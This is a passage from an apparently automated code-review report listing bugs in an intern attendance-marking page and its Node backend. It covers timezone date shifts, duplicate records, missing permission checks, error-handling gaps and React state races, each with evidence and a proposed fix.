**Fix:** Render the footer Download anchor only when `!documentViewer.loading && documentViewer.url`, give `download` the request's `proofDocument.filename`, and add `useEffect(() => () => { if (documentViewer.url) URL.revokeObjectURL(documentViewer.url); }, [documentViewer.url])` for unmount cleanup.

# AdminManualAttendanceMarking — 26 findings

## [CRITICAL] Manually marked date is reported one day earlier by the intern attendance API (UTC vs Asia/Colombo)
`backend/controllers/adminInternDetailsController.js:44` · *date-timezone*

**What's wrong:** markManualAttendance/bulkMarkAttendance store the record as midnight Asia/Colombo (`moment.tz(date,"YYYY-MM-DD",TZ).startOf("day")`, manualAttendanceController.js:90 and :193), which is 18:30 UTC of the PREVIOUS day. adminInternDetailsController's `getDateKey` derives the day with `parsed.toISOString().slice(0,10)` — i.e. UTC — so every manual mark is bucketed under the previous calendar day. Step 6 (line 363-364) pushes `date: dayKey` straight into the response, and Step 7 (line 419) de-duplicates on the same shifted key. Every other daily writer avoids this: dailyRecordController.js:51 uses `new Date(dateStr)` (UTC midnight) and internController.js:35 uses `getColomboDateKey`.

**Failure:** Admin selects 2026-08-04 on AdminManualAttendanceMarking and marks intern 3456 Present (daily). Mongo stores date = 2026-08-03T18:30:00Z. Opening /admin/intern/<id> attendance tab shows the check-in on "2026-08-03" instead of 2026-08-04, and 2026-08-04 still looks like an absence. If the intern also submitted a logbook for 2026-08-04, the page now shows TWO rows: a real 08-04 row plus a phantom 08-03 manual row, and `dailyMethodByDate.get("2026-08-04")` misses the manual entry entirely.

**Evidence:**
```
adminInternDetailsController.js:41-46 `const getDateKey = (date) => { const parsed = date ? new Date(date) : null; return parsed && !Number.isNaN(parsed.getTime()) ? parsed.toISOString().slice(0, 10) : String(date || ""); };`  vs  manualAttendanceController.js:90-93 `const attendanceDate = moment.tz(date, "YYYY-MM-DD", TZ).startOf("day").toDate();`
```

**Fix:** Replace the local `getDateKey` in adminInternDetailsController.js with `getColomboDateKey` from utils/attendanceHistory.js (already used by internController.js and dailyRecordController.js).

## [HIGH] Marking an intern "Absent" silently does nothing when a QR/face check-in already exists for that day
`backend/controllers/manualAttendanceController.js:109` · *logic-error*

**What's wrong:** The duplicate guard only matches records whose `type` is exactly the manual type (`manual_daily` / `manual_meeting`). A daily check-in written by the QR/face flow has type `daily_qr` or `face`, so `sameType` is false and the controller PUSHES a second record `{type:"manual_daily", status:"Absent"}` instead of overriding the existing Present record. Every consumer of daily attendance filters on `status === "Present"` and picks one entry per date by type priority (daily_qr=3, face=4 both beat manual_daily=2), so the extra Absent row is invisible and the intern stays Present. The page still reports success. Same code path exists in bulkMarkAttendance (line 226).

**Failure:** Intern 3421 scans the daily QR at 08:30 (record `{type:'daily_qr', status:'Present', date:2026-08-04}`). Admin later learns he left immediately, opens Manual Attendance, selects him, picks Daily + Absent for 2026-08-04 and submits. The toast says "Absent marked for … (daily)" and the mark is added to Recent Marks, but GET /admin/attendance/by-date-daily?date=2026-08-04 still lists intern 3421 as Present, and the daily attendance PDF still contains him. The admin has no way to mark anyone absent for a day they scanned in.

**Evidence:**
```
manualAttendanceController.js:109-126 — `const duplicate = intern.attendance.find((a) => { … const sameType = a.type === type; … });  if (duplicate) { duplicate.status = status; } else { intern.attendance.push(record); }`  ||  admininternAttendanceController.js:40-45 `DAILY_ATTENDANCE_TYPES = new Set(["daily","daily_qr","face","manual_daily"])` and :238-247 `records = (intern.attendance||[]).filter(record => DAILY_ATTENDANCE_TYPES.has(type) && record.status === "Present" …)`  ||  utils/attendanceHistory.js:29-34 `DAILY_TYPE_PRIORITY = { face:4, daily_qr:3, manual_daily:2, daily:1 }`
```

**Fix:** Match the duplicate against the whole daily/meeting type set for that date (reuse DAILY_ATTENDANCE_TYPES / MEETING_ATTENDANCE_TYPES), and when the admin marks Absent, update/remove the existing Present record for the date instead of appending a new one. At minimum return `overridden:false` so the page can warn the admin.

## [HIGH] Manual attendance is stored at Colombo midnight while every other writer stores UTC midnight — the record shows up one day early (or vanishes) on the intern details page
`backend/controllers/manualAttendanceController.js:90` · *date-timezone*

**What's wrong:** markManualAttendance/bulkMarkAttendance store `moment.tz(date,"YYYY-MM-DD","Asia/Colombo").startOf("day")`, i.e. 18:30:00Z of the PREVIOUS UTC day. Every other writer stores the local day as UTC midnight (`new Date(`${today}T00:00:00.000Z`)`) and DailyRecord stores a plain "YYYY-MM-DD" string. adminInternDetailsController keys attendance by `new Date(x).toISOString().slice(0,10)` (UTC), so manual records land on the previous calendar day, while QR/face/logbook records land on the correct day.

**Failure:** Admin marks intern 3421 Daily/Present for 2026-08-04. The record is written as 2026-08-03T18:30:00.000Z. Opening Admin → intern 3421 → Attendance, the manual entry is listed under 2026-08-03 (Step 6 pushes `date: dayKey` where dayKey = "2026-08-03"). Worse: if that intern already has any daily attendance on 2026-08-03, `coveredDates.has(dayKey)` is true and the 2026-08-04 manual mark is dropped from the response entirely — the admin sees no record at all for the day they just marked.

**Evidence:**
```
manualAttendanceController.js:90-93 `const attendanceDate = moment.tz(date, "YYYY-MM-DD", TZ).startOf("day").toDate();`  ||  services/attendanceWorkflowService.js:330 `date: new Date(`${today}T00:00:00.000Z`)`  ||  adminInternDetailsController.js:41-46 `const getDateKey = (date) => { … parsed.toISOString().slice(0, 10) … }` used at :355 `const dayKey = getDateKey(entryDate);` and :356 `if (coveredDates.has(dayKey)) return;` and :364 `date: dayKey`
```

**Fix:** Store the same instant the rest of the system stores — `new Date(`${date}T00:00:00.000Z`)` — or change adminInternDetailsController's getDateKey to the existing `getColomboDateKey` helper from utils/attendanceHistory.js (internController.js:35 already does this).

## [HIGH] Manual meeting mark creates a duplicate meeting row and inflates the intern's present stat
`backend/controllers/manualAttendanceController.js:226` · *data-integrity*

**What's wrong:** Same type-scoped duplicate guard problem for meetings: only `manual_meeting` records are deduplicated, so a meeting the intern already attended via the meeting PIN QR (`qr`) or face (`face_meeting`) gets a second record with the same date and meetingName. Unlike the daily list, adminInternDetailsController never de-duplicates `meetingAttendance` (Step 3 line 221 pushes every meeting-typed entry; Step 7 line 425 only sorts), and `stats.present` at line 442 counts raw rows.

**Failure:** Intern 3456 scans the meeting PIN for "General Meeting" on 2026-08-04 (type `qr`). The admin then bulk-marks the same meeting Present for 2026-08-04 from this page. GET /admin/intern/<id>/attendance now returns two "General Meeting" rows for 2026-08-04 and stats.present is 2 instead of 1, so the intern's meeting attendance count/percentage is inflated for every meeting the admin double-marks.

**Evidence:**
```
manualAttendanceController.js:226-235 `const sameType = a.type === type;` (type === "manual_meeting") and adminInternDetailsController.js:425 `meetingAttendance.sort((a, b) => new Date(b.date) - new Date(a.date));` with no dedupe, line 442 `present: meetingAttendance.filter((e) => e.status === "Present").length`.
```

**Fix:** Deduplicate meetings on (Colombo date + normalized meetingName) across all MEETING_ATTENDANCE_TYPES rather than only `manual_meeting`.

## [MEDIUM] Page renders the full marking UI without checking `attendance.manage`, so supervisors get a form whose every submit 403s
`frontend/src/pages/AdminManualAttendanceMarking.jsx:1119` · *permissions*

**What's wrong:** The route is only guarded by AdminRoute (token + any role). The page never calls `hasAdminPermission`. The backend maps every non-GET under /manual-attendance to `attendance.manage` (adminAuth.js:33-34), which the `supervisor` role does not have. The GET search endpoint only needs `attendance.view`, which supervisors DO have, so the page looks fully functional — search returns interns, the intern gets selected, the submit button turns blue — and only the final POST fails.

**Failure:** A supervisor (role `supervisor`, permissions dashboard.view/interns.view/daily_logs.view/attendance.view/leave.view) opens /admin/intern-attendance (visible in their nav) and clicks the ungated "Mark Attendance" button (Admininternattendance.jsx:913). They search an intern, get results, pick Daily/Present and press "Mark Present · Daily". The POST returns 403 and they get a red "Mark failed" toast with no explanation; repeating with bulk mode fails identically. Nothing in the UI ever indicates they lack the permission.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:1119-1124 `<motion.button onClick={inputMode === "single" ? handleMark : handleBulkMark} disabled={!canSubmit || marking} …>` — no permission check anywhere in the file (`hasAdminPermission` is never imported)  ||  backend/middleware/adminAuth.js:33-34 `if (path.startsWith("/attendance") || … || path.startsWith("/manual-attendance")) { return req.method === "GET" ? "attendance.view" : "attendance.manage"; }`  ||  backend/config/adminPermissions.js:12-15 supervisor has no `attendance.manage`
```

**Fix:** Import `hasAdminPermission` from utils/adminAuth and either redirect/render a "read-only" notice when `!hasAdminPermission("attendance.manage")`, or disable the submit + upload controls with an explanatory message; also gate the "Mark Attendance" button on Admininternattendance.jsx:913.

## [MEDIUM] All API error bodies are read as `.error`, but auth/permission/middleware errors return `.message` — session expiry and 403s show a generic "Mark failed"
`frontend/src/pages/AdminManualAttendanceMarking.jsx:61` · *error-handling*

**What's wrong:** The three API helpers read `(await res.json()).error`. Only the manual-attendance controller uses `{ error }`; authMiddleware (401), adminAuth (403) and the global errorHandler (500 from multer etc.) all return `{ message }`. So every auth-layer failure is flattened to the generic fallback string. There is also no 401 handling at all — an expired token never redirects to /admin-login, so the page just keeps failing.

**Failure:** An admin leaves the tab open until the JWT expires, then marks an intern. The backend replies 401 `{message:"Session expired. Please log in again.", code:"TOKEN_EXPIRED"}`. The page shows a red "Mark failed" toast, keeps the intern selected, and stays on the page; every retry shows the same message and the admin has no idea they need to log in again. Same for the 403 in the supervisor case, and for uploading 21+ images (multer "Unexpected field" → 500 `{message}` → "Failed to process images").

**Evidence:**
```
AdminManualAttendanceMarking.jsx:51 `if (!res.ok) throw new Error((await res.json()).error || "Search failed");`, :61 `… || "Mark failed"`, :75 `… || "Bulk mark failed"`  ||  backend/middleware/authMiddleware.js:21-24 `return res.status(401).json({ message: "Session expired. Please log in again.", code: "TOKEN_EXPIRED" });`  ||  backend/middleware/adminAuth.js:24 `res.status(403).json({ message: `Permission required: ${permission}`, code: "FORBIDDEN" })`  ||  backend/middleware/errorMiddleware.js:3-5 `res.status(err.status || 500).json({ message: … })`
```

**Fix:** Read `body.error || body.message`, wrap `res.json()` in a try/catch for non-JSON bodies, and on 401 clear `adminInfo` and navigate to /admin-login.

## [MEDIUM] Search query is compiled straight into `new RegExp(q)` — typing a regex metacharacter returns a 500
`backend/controllers/manualAttendanceController.js:19` · *crash*

**What's wrong:** `searchInternForAttendance` builds `new RegExp(q, "i")` from unescaped user input. Any query that is not a valid regex throws a SyntaxError inside the try block and is answered with 500 "Internal server error". Unescaped input is also a ReDoS vector against the search endpoint (e.g. `(a+)+$`).

**Failure:** The admin types `(` (or `+`, `*`, `[`, `?`) into the "Type ID, name or email…" box — e.g. searching for a name recorded as "Perera (Nimal)". 350 ms later the request fires, `new RegExp("(","i")` throws "Invalid regular expression: Unterminated group", the endpoint returns 500 and the page shows a red "Internal server error" toast plus "No interns found matching …" instead of results.

**Evidence:**
```
manualAttendanceController.js:19 `const regex = new RegExp(q, "i");` used at :22-26 for `$or: [{Trainee_ID: regex}, {Trainee_Name: regex}, {Trainee_Email: regex}]`; the throw is caught at :35 and answered `res.status(500).json({ error: "Internal server error" })`
```

**Fix:** Escape the input before compiling: `const regex = new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");` (backend/services/attendanceWorkflowService.js:22 already has an `escapeRegExp` helper).

## [MEDIUM] Pending search debounce is never cancelled on clear/select/unmount — stale results reappear after the box is cleared
`frontend/src/pages/AdminManualAttendanceMarking.jsx:383` · *react-state*

**What's wrong:** `searchDebounce.current` is only cleared inside `handleSearch`. The clear (X) button, `handleSelectIntern` and component unmount all leave a pending 350 ms timer alive, so the queued fetch still runs and calls `setSearchResults`/`setSearchLoading` afterwards. There is no `useEffect` cleanup for the ref at all.

**Failure:** Admin types "kum" and immediately clicks the X button (within 350 ms). The box empties and the dropdown disappears — then ~300 ms later the queued request for "kum" resolves and the result dropdown pops back up over an empty search box, with a selectable list that no longer matches anything typed. Same on select: type "kav", click a result card, and the queued request repaints the dropdown on top of the "selected intern" panel. Navigating away mid-debounce fires setState on an unmounted component.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:383 `if (searchDebounce.current) clearTimeout(searchDebounce.current);` (only inside handleSearch) — :388 `searchDebounce.current = setTimeout(async () => { … setSearchResults(data.interns || []); … })`; :867-872 clear button `onClick={() => { setSearchQuery(""); setSearchResults([]); setSelectedIntern(null); }}` and :402-406 `handleSelectIntern` never touch `searchDebounce`; no `useEffect(() => () => clearTimeout(searchDebounce.current), [])` exists in the file.
```

**Fix:** Extract a `cancelPendingSearch()` that clears the ref, call it from the X button and handleSelectIntern, and add `useEffect(() => () => clearTimeout(searchDebounce.current), [])`.

## [MEDIUM] Search has no request cancellation — a slow earlier response overwrites the newer result list
`frontend/src/pages/AdminManualAttendanceMarking.jsx:391` · *race-condition*

**What's wrong:** Each debounce tick fires a bare `fetch` with no AbortController and no request-sequence guard. Responses are applied in completion order, so an older in-flight query can overwrite the results of a newer one, and the older request's `finally` clears `searchLoading` while the newer one is still pending.

**Failure:** Admin types "kum", pauses (request A fires, server is slow), then types "kumari" (request B fires 350 ms later and returns in 200 ms, showing 2 matching interns). Two seconds later request A resolves and replaces the dropdown with the 10 matches for "kum" while the input still reads "kumari" — the admin picks the wrong intern from a list that does not correspond to what is in the box.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:388-399 `searchDebounce.current = setTimeout(async () => { setSearchLoading(true); try { const data = await manualAttendanceApi.searchIntern(query); setSearchResults(data.interns || []); } … finally { setSearchLoading(false); } }, 350);` — and :46-53 `searchIntern` builds a plain `fetch` with no `signal`.
```

**Fix:** Keep an AbortController (or a monotonically increasing request id) in a ref; abort/ignore the previous request before starting a new one and only apply results whose id is the latest.

## [MEDIUM] Image OCR endpoint swallows every per-image failure and returns 200 with an empty list, so server errors are reported as "no IDs in the images"
`backend/controllers/manualAttendanceController.js:378` · *error-handling*

**What's wrong:** `extractIdsFromImages` wraps each Gemini call in a try/catch that only `console.error`s. If every call fails (bad/missing model, quota exhausted, invalid key at request time, network error) the handler still responds `{ success: true, ids: [] }`. The page treats an empty `ids` array as "nothing detected" and shows a red toast blaming the images.

**Failure:** GEMINI_API_KEY is present but expired/over quota. Admin uploads 5 clear attendance-sheet photos. Every generateContent call rejects, the response is 200 `{success:true, ids:[]}`, and the page shows "No valid Intern IDs found in the images". The admin re-photographs the sheets and retries repeatedly; nothing in the UI or the response indicates the OCR service itself is down.

**Evidence:**
```
manualAttendanceController.js:365-381 `const result = await model.generateContent([prompt, imagePart]); … } catch (err) { console.error("Vision processing error for one file:", err); }` then :384-386 `const uniqueIds = [...new Set(allFoundIds)]; return res.json({ success: true, ids: uniqueIds });`  ||  frontend AdminManualAttendanceMarking.jsx:565-568 `const uniqueIds = data.ids || []; if (uniqueIds.length === 0) { showToast("No valid Intern IDs found in the images", "error"); }`
```

**Fix:** Count failures per file and return them (e.g. `{ ids, failed: [{name, error}] }`); respond 502 when every image failed, and have the page distinguish "OCR service failed" from "no IDs found".

## [MEDIUM] Intern search has no request cancellation — a slow earlier response overwrites newer results
`frontend/src/pages/AdminManualAttendanceMarking.jsx:388` · *race-condition*

**What's wrong:** The 350 ms debounce only guards timer scheduling. Once a fetch has been dispatched, further typing dispatches additional fetches with no AbortController and no request-sequence check, so whichever response lands last wins. `setSearchLoading(false)` in the `finally` block also belongs to whichever request finishes last, hiding the spinner while a newer request is still in flight.

**Failure:** Admin types "34" (fetch A dispatched, slow — matches hundreds of interns), keeps typing to "3456" 400 ms later (fetch B dispatched, returns in 80 ms and renders the single correct intern). Fetch A returns 1 s later and calls `setSearchResults(dataA.interns)`, replacing the dropdown with the results for "34" while the input still reads "3456". The admin clicks the top card and marks attendance for the WRONG intern.

**Evidence:**
```
lines 388-399: `searchDebounce.current = setTimeout(async () => { setSearchLoading(true); try { const data = await manualAttendanceApi.searchIntern(query); setSearchResults(data.interns || []); } ... finally { setSearchLoading(false); } }, 350);` — no AbortController, no `if (query !== latestQueryRef.current) return;` guard.
```

**Fix:** Keep a `latestQueryRef`/request-id and ignore responses that are not the newest, or pass an AbortController signal into `manualAttendanceApi.searchIntern` and abort the previous request on each new keystroke.

## [MEDIUM] Pending search debounce is never cleared on select, clear, or unmount — dropdown re-opens after an intern is chosen
`frontend/src/pages/AdminManualAttendanceMarking.jsx:402` · *react-state*

**What's wrong:** `handleSelectIntern` and the clear (X) button both call `setSearchResults([])` but neither clears `searchDebounce.current`. There is also no `useEffect` cleanup clearing the timer on unmount, so a fetch and `setSearchResults`/`setSearchLoading` fire after the admin navigates away.

**Failure:** Admin types "Kav" (results render), types one more char "Kavi" (a new 350 ms timer starts, old results still visible), then clicks the intern card at ~150 ms. `selectedIntern` is set and the dropdown closes; 200 ms later the pending timer fires, the search runs and the dropdown re-opens over the freshly rendered "selected intern" panel. Same effect after pressing the X clear button. Navigating away in that window fires a fetch and setState on an unmounted component.

**Evidence:**
```
lines 402-406 `const handleSelectIntern = (intern) => { setSelectedIntern(intern); setSearchQuery(intern.Trainee_Name); setSearchResults([]); };` and lines 867-872 (clear button) — neither calls `clearTimeout(searchDebounce.current)`; the component has no unmount cleanup effect for `searchDebounce`.
```

**Fix:** Call `clearTimeout(searchDebounce.current)` in `handleSelectIntern` and in the clear button handler, and add `useEffect(() => () => clearTimeout(searchDebounce.current), [])`.

## [MEDIUM] Excel import wipes the ID textarea and shows a green success toast even when it parses zero IDs
`frontend/src/pages/AdminManualAttendanceMarking.jsx:716` · *data-loss*

**What's wrong:** `handleExcelUpload` unconditionally overwrites `bulkInternIds` with `presentIds.join("\n")` — including when `presentIds` is empty — and then reports it with a `"success"` toast. The only guard is the header lookup (line 693); rows whose Status column holds anything other than the literal word "present" are silently skipped.

**Failure:** Admin OCR-scans three attendance photos and collects 42 IDs in the textarea, then uploads an Excel whose Status column contains "P" / "Yes" / "PRESENT ✓". The header row is found, but the `status.toLowerCase() === "present"` test matches nothing, so the textarea is cleared to an empty string and a GREEN toast says "0 present interns loaded". All 42 OCR-derived IDs are gone with no undo.

**Evidence:**
```
lines 711-720: `if (internId && status.toLowerCase() === "present") { presentIds.push(internId); } ... setBulkInternIds(presentIds.join("\n")); setUploadedExcelFileName(file.name); showToast(`${presentIds.length} present interns loaded`, "success");`
```

**Fix:** Bail out with an error toast when `presentIds.length === 0` (leaving the textarea untouched), and merge into the existing IDs the way `handleImageUpload` does instead of overwriting.

## [LOW] Recent-marks list uses a negative slice bound when a bulk run succeeds for more than 10 interns
`frontend/src/pages/AdminManualAttendanceMarking.jsx:523` · *logic-error*

**What's wrong:** `prev.slice(0, 10 - successfulMarks.length)` is intended to cap the session list at 10 items. When more than 10 marks succeed the end index goes negative, and `Array.prototype.slice` treats a negative end as `length + end`, so instead of dropping the old entries it keeps all but the last N of them and the list grows without bound.

**Failure:** Admin pastes 12 intern IDs and bulk-marks them; all 12 succeed while 10 previous marks are in the panel. `prev.slice(0, -2)` returns the first 8 old entries, so "Recent Marks" now holds 20 rows. A second 12-ID bulk run makes it 30, and so on — the right-hand panel (which advertises a 10-item session log) keeps growing and keeps rendering stale entries that should have been evicted.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:521-524 `setRecentMarks((prev) => [ ...successfulMarks, ...prev.slice(0, 10 - successfulMarks.length), ]);` (compare the correct single-mark path at :450 `...prev.slice(0, 9)`)
```

**Fix:** `setRecentMarks((prev) => [...successfulMarks, ...prev].slice(0, 10));`

## [LOW] PDF/Excel file inputs are never reset, so re-selecting the same file does nothing
`frontend/src/pages/AdminManualAttendanceMarking.jsx:589` · *react-state*

**What's wrong:** `handleImageUpload` resets `event.target.value = null` in its finally block, but `handlePdfUpload` and `handleExcelUpload` do not. Because the file input keeps its previous value, choosing the identical file a second time fires no `change` event and the handler never runs — with zero feedback to the user.

**Failure:** Admin uploads meeting_sheet.pdf, the 30 IDs load, and they bulk-mark Meeting attendance (the textarea is cleared on success). They then want to mark the same 30 people for Daily attendance, click "Upload Attendance PDF" and pick meeting_sheet.pdf again — nothing happens: no toast, no IDs, the textarea stays empty. They must pick a different file first or reload the page.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:584-586 (images) `finally { setOcrScanning(false); event.target.value = null; }` vs handlePdfUpload :589-643 and handleExcelUpload :667-726, neither of which touches `event.target.value`.
```

**Fix:** Reset `event.target.value = null` at the end of both handlers (in a finally block).

## [LOW] PDF and Excel imports overwrite the ID textarea while OCR appends — previously collected IDs are silently discarded
`frontend/src/pages/AdminManualAttendanceMarking.jsx:632` · *data-integrity*

**What's wrong:** `handleImageUpload` merges new IDs into the existing textarea content, but `handlePdfUpload` and `handleExcelUpload` call `setBulkInternIds(ids.join("\n"))`, replacing whatever was there (typed IDs or OCR results) with no warning or confirmation.

**Failure:** Admin photographs three paper attendance sheets, runs OCR and gets 45 IDs in the textarea, then uploads the Excel export for the remaining group. The Excel import replaces all 45 OCR IDs with the 20 Excel IDs; the success toast reads "20 present interns loaded", and the admin bulk-marks only 20 of the 65 people who were actually present.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:570-577 (OCR) `setBulkInternIds((prev) => { const existing = prev.split(/[\n,]+/)…; const combined = [...new Set([...existing, ...uniqueIds])]; return combined.join("\n"); });` vs :632 `setBulkInternIds(uniqueIds.join("\n"));` (PDF) and :716 `setBulkInternIds(presentIds.join("\n"));` (Excel)
```

**Fix:** Use the same merge-with-Set functional updater in the PDF and Excel handlers, or prompt before replacing a non-empty textarea.

## [LOW] "Loaded: <file>" labels are never cleared after a successful bulk mark or a mode switch
`frontend/src/pages/AdminManualAttendanceMarking.jsx:526` · *react-state*

**What's wrong:** `handleBulkMark` clears `bulkInternIds` on success but leaves `uploadedFileName` and `uploadedExcelFileName` set, and nothing resets them when the input mode or attendance mode changes. The UI therefore claims a file is loaded while the ID list is empty.

**Failure:** Admin uploads sheet.pdf ("Loaded: sheet.pdf" appears), bulk-marks the 30 IDs successfully, and the textarea empties. The amber "Loaded: sheet.pdf" line stays on screen, so the admin believes the file is still queued, clicks "Bulk Mark Present · Daily" again and gets "Please enter at least one intern ID".

**Evidence:**
```
AdminManualAttendanceMarking.jsx:526 `setBulkInternIds("");` (no `setUploadedFileName("")` / `setUploadedExcelFileName("")`), rendered at :1016-1020 and :1038-1042 `{uploadedFileName && (<p …>Loaded: {uploadedFileName}</p>)}`
```

**Fix:** Clear both file-name states alongside `setBulkInternIds("")` on success and when `inputMode` changes.

## [LOW] "No interns found matching …" is displayed during the 350 ms debounce window before the search even starts
`frontend/src/pages/AdminManualAttendanceMarking.jsx:927` · *react-state*

**What's wrong:** `setSearchLoading(true)` happens inside the debounced callback, so between the keystroke and the timer firing `searchQuery` is non-empty, `searchLoading` is false and `searchResults` is empty — exactly the condition that renders the empty-state message. Nothing distinguishes "debounce pending" from "server returned nothing".

**Failure:** Admin types the first character of an intern ID. For ~350 ms the panel shows `No interns found matching "3"`, then the spinner appears and results replace it. On a slow keyboard/typing pace the message flickers on every keystroke, repeatedly telling the admin the intern does not exist.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:927-934 `{searchQuery && !searchLoading && searchResults.length === 0 && !selectedIntern && (<p …>No interns found matching "{searchQuery}"</p>)}` vs :388-390 `searchDebounce.current = setTimeout(async () => { setSearchLoading(true); …}, 350)`
```

**Fix:** Set `setSearchLoading(true)` synchronously in `handleSearch` when the query is non-empty (or track a `searchPending` flag) and suppress the empty state while it is true.

## [LOW] Toast auto-dismiss timer restarts on every parent re-render because `onClose` is an inline arrow
`frontend/src/pages/AdminManualAttendanceMarking.jsx:85` · *react-state*

**What's wrong:** `Toast`'s effect depends on `onClose`, which is created fresh on each render at the call site (`onClose={() => setToast(null)}`). Any parent state change tears down and recreates the 4.5 s timer, so the toast can stay on screen indefinitely while the admin keeps interacting with the page.

**Failure:** Admin bulk-marks a batch, gets the green success toast, then immediately starts typing/pasting the next batch of IDs into the textarea. Every keystroke re-renders the page, resets the timer, and the stale success toast stays pinned over the bottom-right of the screen for as long as they keep typing.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:82-85 `React.useEffect(() => { const t = setTimeout(onClose, 4500); return () => clearTimeout(t); }, [onClose]);` and :750 `{toast && <Toast toast={toast} onClose={() => setToast(null)} />}`
```

**Fix:** Depend on the toast identity instead (`[toast]`), or wrap the close handler in `useCallback(() => setToast(null), [])`.

## [LOW] `selectedDate` is initialised once at mount, so a tab left open past midnight keeps writing attendance to the previous day
`frontend/src/pages/AdminManualAttendanceMarking.jsx:357` · *date-timezone*

**What's wrong:** `today` is recomputed on every render (line 352) but `selectedDate` is only seeded from it in the initial `useState`. After the Sri Lanka date rolls over, the form keeps the old date and there is no effect to re-sync it; the only cue is the small "Today" button appearing.

**Failure:** An admin marking late-shift meeting attendance leaves the page open from 23:50 to 00:10. At 00:10 the date input still reads 2026-08-04 while the real date is 2026-08-05. They mark 20 interns present; all 20 records are written to 2026-08-04 and the 2026-08-05 attendance report shows them absent.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:352 `const today = getLocalToday();`, :357 `const [selectedDate, setSelectedDate] = useState(today);`, :827 `{selectedDate !== today && (<motion.button onClick={() => setSelectedDate(today)}>Today</motion.button>)}` — no effect resyncs `selectedDate`.
```

**Fix:** Add an interval/visibilitychange effect that recomputes `getLocalToday()` and, if `selectedDate` still equals the previous day's default, advances it (or at least surfaces a visible "date has changed" warning).

## [LOW] No future-date guard on the client and no date validation on the server
`frontend/src/pages/AdminManualAttendanceMarking.jsx:821` · *data-integrity*

**What's wrong:** The date input has no `max` attribute and the controller only checks that `date` is truthy — it never validates the format with `moment(...).isValid()` before calling `.toDate()`. Any date, including years in the future, is accepted and written; a malformed date produces an Invalid Date that fails at save time with an opaque 500.

**Failure:** Admin mistypes the year in the date field (2026 → 2062) and bulk-marks 40 interns Present. All 40 records are written with date 2062-xx-xx; they disappear from every real report but permanently pollute `intern.attendance`, and there is no UI in the app to delete them. If a browser without native date support submits "04/08/2026", `moment.tz("04/08/2026","YYYY-MM-DD",TZ)` yields an Invalid Date and `intern.save()` throws, returning "Internal server error" with no indication that the date was the problem.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:821-826 `<input type="date" value={selectedDate} onChange={(e) => setSelectedDate(e.target.value)} … />` (no `max={today}`)  ||  backend/controllers/manualAttendanceController.js:67 `if (!date) return res.status(400).json({ error: "date is required" });` and :90-93 `moment.tz(date, "YYYY-MM-DD", TZ).startOf("day").toDate()` with no `.isValid()` check
```

**Fix:** Add `max={today}` to the date input and validate on the server: reject when `!parsed.isValid()` or when the date is in the future (400 with a clear message).

## [LOW] Bulk-mark result panel stays on screen after switching to single mode or performing a later mark
`frontend/src/pages/AdminManualAttendanceMarking.jsx:1153` · *react-state*

**What's wrong:** `bulkResults` is only reset at the start of the next bulk submission (line 481) or on bulk failure. Switching `inputMode` back to "single", changing the attendance mode/date, or performing single marks leaves the previous per-intern success/failure list rendered directly under the submit button.

**Failure:** Admin bulk-marks 30 IDs for the meeting and sees the results list with 3 red "Intern not found" rows. They switch to Single mode to fix those three by name; after each successful single mark the same stale red rows remain under the button, making it look as if the single marks are still failing.

**Evidence:**
```
AdminManualAttendanceMarking.jsx:1152-1210 `{bulkResults && (<motion.div …>{bulkResults.results.map(...)}</motion.div>)}`; `setBulkResults(null)` appears only at :481 and :529, and `InputModeSelector`'s `onChange={setInputMode}` (:786-788) does not clear it.
```

**Fix:** Call `setBulkResults(null)` when `inputMode`, `mode` or `selectedDate` changes, and after a successful single mark.

## [LOW] PDF and Excel file inputs are never reset — re-selecting the same file does nothing
`frontend/src/pages/AdminManualAttendanceMarking.jsx:643` · *react-state*

**What's wrong:** `handleImageUpload` clears `event.target.value` in its finally block (line 585), but `handlePdfUpload` and `handleExcelUpload` do not. Because the input still holds the same file, selecting it again fires no `change` event and the handler never runs.

**Failure:** Admin uploads sheet.pdf (30 IDs load), then edits the textarea and accidentally deletes everything (or an Excel upload overwrote it). They click "Upload Attendance PDF" and pick the same sheet.pdf again — nothing happens at all, no toast, no IDs. They must pick a different file first or reload the page.

**Evidence:**
```
`handlePdfUpload` ends at line 643 and `handleExcelUpload` at line 726 with no `event.target.value = null`, unlike line 585 `event.target.value = null;` in `handleImageUpload`.
```

**Fix:** Add `event.target.value = null` (in a finally block) to `handlePdfUpload`, `handleExcelUpload` and `handleTxtUpload`.

## [LOW] No client-side cap on OCR image count while the server accepts at most 20 — whole batch fails with a generic message
`frontend/src/pages/AdminManualAttendanceMarking.jsx:534` · *api-contract*

**What's wrong:** The file input is `multiple` with no limit, and `handleImageUpload` appends every selected file to the FormData. The route uses `upload.array("images", 20)` (adminRoutes.js:228); exceeding it makes multer throw `LIMIT_UNEXPECTED_FILE`, which errorMiddleware.js turns into a 500 `{message:"Unexpected field"}` — and since the page reads `data.error`, the toast is the generic fallback.

**Failure:** Admin selects 24 photos of the sign-in sheets. After the upload completes, multer rejects the 21st file, the request 500s and the toast says "Failed to process images. Please try again." No IDs are extracted from ANY of the 24 images and nothing indicates the 20-file limit.

**Evidence:**
```
lines 543-545 `for (let i = 0; i < files.length; i++) { formData.append("images", files[i]); }` with `<input type="file" ... multiple />` at line 988-995; backend/routes/adminRoutes.js:226-230 `upload.array("images", 20)`; backend/middleware/errorMiddleware.js:3-5 returns `{ message: err.message }`.
```

**Fix:** Reject (or chunk) selections over 20 files client-side with an explicit toast, and surface `data.message` as well as `data.error`.

## [LOW] "IDs detected" counter does not de-duplicate while the submit path does
`frontend/src/pages/AdminManualAttendanceMarking.jsx:960` · *logic-error*

**What's wrong:** The counter under the textarea splits and filters but never dedupes, whereas `handleBulkMark` applies `[...new Set(rawIds)]` (line 470) before sending. The number shown and the number actually processed diverge whenever the pasted/imported list contains repeats (which the Excel/TXT importers can easily produce).

**Failure:** Admin pastes a list where intern 3456 appears on two pages of the sign-in sheet: "3455, 3456, 3456, 3457". The UI says "4 IDs detected", but the bulk request sends 3 and the results panel lists 3 rows, so the admin believes one intern was silently dropped and re-enters it.

**Evidence:**
```
